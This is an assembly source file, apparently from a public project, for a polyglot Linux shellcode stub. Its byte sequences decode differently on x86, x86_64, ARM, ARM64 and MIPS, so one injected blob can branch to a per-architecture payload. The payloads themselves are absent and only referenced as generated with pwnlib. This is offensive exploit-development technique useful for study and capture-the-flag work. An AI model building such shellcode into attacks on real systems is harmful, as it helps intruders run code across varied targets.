;
; https://github.com/ixty/xarch_shellcode
;
; 2016 - ixty
; multi-arch linux shellcode
; works on:
;   x86
;   x86_64
;   arm
;   arm_64
;   mips

; compile with nasm
bits 32
_start:


; ======================================================================= ;
; init, polyglot shellcode for arm, arm64, x86, x86_64, mips
; branches out to specific arch dependent payloads
; ======================================================================= ;

; x86       jmp     _x86     ; junk
; x86_64    jmp     _x86     ; junk
; arm       andscc  r1, r2, #0xb000000e
; arm64     orr     w11, w23, #0x7c000
; mips      andi    s2, s0, 0x12eb
    db 0xeb, (_x86 - $ - 2), 0x12, 0x32

; arm       andsne  r0, r0, #0x62
; arm64     and     w2, w3, #0x10000
; mips      beq     s0, s0, _mips
    db ((_mips - $ - 4) / 4), 0x00, 0x10, 0x12
; It's needed because mips will execute next instruction regardles of jump. (Don't ask my why)
; arm       andscc  r1, r2, #0xb000000e
; arm64     orr     w11, w23, #0x7c000
; mips      andi    s2, s0, 0x12eb
    db 0xeb, (_x86 - $ - 2), 0x12, 0x32

; arm       b       _arm
; arm64     ands    x1, x0, x0
    db ((_arm - $ - 8) / 4), 0x00, 0x00, 0xea

; arm64     b       _arm64
    db ((_arm64 - $) / 4), 0x00, 0x00, 0x14


; ======================================================================= ;
; x86 only, detect 32/64 bits
; ======================================================================= ;

_x86:
; x86       xor eax, eax;
; x86_64    xor eax, eax;
    xor eax, eax
; x86       inc eax
; x86_64    REX + nop
    db 0x40
    nop
    jz _x86_64

; x86       jmp x86_32
    jmp _x86_32


; ======================================================================= ;
; PAYLOADs
; ======================================================================= ;
; Generated dynamically with pwnlib.shellcraft
